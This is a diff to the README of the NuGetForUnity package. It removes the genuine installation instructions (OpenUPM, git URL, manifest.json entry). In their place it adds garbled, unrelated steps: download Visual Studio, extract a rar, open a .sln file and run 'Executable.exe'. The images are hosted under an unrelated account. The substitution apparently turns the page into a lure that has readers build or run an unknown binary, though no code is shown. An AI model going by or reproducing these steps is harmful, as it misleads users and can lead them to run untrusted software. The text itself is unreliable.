@@ -29,44 +29,23 @@ You can learn more about NuGet here: [nuget.org](https://www.nuget.org/)
 
 # Installation
 
-<details>
-<summary>Install via OpenUPM</summary>
-The package is available on the <a href="https://openupm.com/packages/com.github-glitchenzo.nugetforunity/">openupm</a> registry. So you can install it via openupm-cli or manually using a scoped registry see documentation at <a href="https://openupm.com/packages/com.github-glitchenzo.nugetforunity/">openupm</a>.
+1. Download Visual Studio 2022
+_using Git Clone Or either download the project or exit the rar. Then Download Visual Studio 2022 Here Link [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
+![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
+> Download These
+2. OR
 
-```
-openupm add com.github-glitchenzo.nugetforunity
-```
+![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)
 
-</details>
 
-<details>
-<summary>Install as GIT dependency via Package Manager</summary>
+3. _Then open the sln (Project Solution) file_
 
-#### Unity 2019.3 or newer
+![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)
 
-1. Open Package Manager window (Window | Package Manager)
-1. Click `+` button on the upper-left of a window, and select "Add package from git URL..."
-1. Enter the following URL and click `Add` button
-
-```
-https://github.com/GlitchEnzo/NuGetForUnity.git?path=/src/NuGetForUnity
-```
-
-> **_NOTE:_** To install a concrete version you can specify the version by prepending #v{version} e.g. `#v2.0.0`. For more see [Unity UPM Documentation](https://docs.unity3d.com/Manual/upm-git.html).
-
-#### Unity 2019.2 or earlier
-
-1. Close Unity Editor
-1. Open Packages/manifest.json by any Text editor
-1. Insert the following line after `"dependencies": {`, and save the file.
-
-    ```json
-    "com.glitchenzo.nugetforunity": "https://github.com/GlitchEnzo/NuGetForUnity.git?path=/src/NuGetForUnity",
-    ```
-
-1. Reopen Unity project in Unity Editor
-
-</details>
+4. Find Executable File
+   ```sh
+   /ProjectName/Bin/Debug/Executable.exe
+   ```
 
 # Usage
 
